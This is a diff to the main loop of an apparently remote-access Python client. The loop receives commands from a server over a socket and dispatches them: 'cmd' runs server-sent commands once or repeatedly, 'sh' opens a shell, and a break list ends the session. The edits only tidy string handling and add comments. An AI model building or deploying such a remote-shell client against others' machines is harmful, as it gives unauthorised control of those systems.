@@ -521,11 +521,11 @@ def main():
         mysendall(mysocket, data, delimiter)
         # We receive a command, then if it matches a key word
         # complete the appropriate action
-        command = myrecvall(mysocket, delimiter).decode()
+        command = myrecvall(mysocket, delimiter).decode().strip()
         # create a list of words to stop the client
         breaklist = ['dc','qt','ex']
         # If the command is in the breaklist exit the client
-        if command.strip() in breaklist:
+        if command in breaklist:
             # if quit is received break loop and terminate connection to server
             data = '{0}[!]{1} Connection terminated at client'.format(white, stop).encode()
             mysendall(mysocket, data, delimiter)
@@ -547,18 +547,27 @@ def main():
             # go back to beginning of loop
             continue
         elif command[:3] == 'cmd':
+            # If cmd - command is received create a message to let the server know
+            # that the client is ready for commands and encode it as bytes
             data = '{0}[!]{1} Client ready for commands'.format(turquoise, stop).encode()
+            # Send the server the message
             mysendall(mysocket, data, delimiter)
-            ask = myrecvall(mysocket, delimiter).decode()
-            if ask.strip() == 's':
+            # Receive the single or multiple command answer from the server
+            ask = myrecvall(mysocket, delimiter).decode().strip()
+            # If s - single run the commandant function once
+            if ask == 's':
                 # If command is received call the function above
                 commandant(mysocket, delimiter)
-                # Go back to the beginning of the loop
+                # go back to the beginning of the loop
                 continue
-            elif ask.strip() == 'm':
+            # If m - multiple run the multi function
+            elif ask == 'm':
+                # The multi function will run commands in a loop
                 multi(mysocket, delimiter)
+                # go back to the beginning of the loop
                 continue
         elif command[:2] == 'sh':
+            # If sh - shell is received run the shell function
             shell(mysocket, delimiter)
             continue
         elif command.strip() == '[-] ctrl+c':
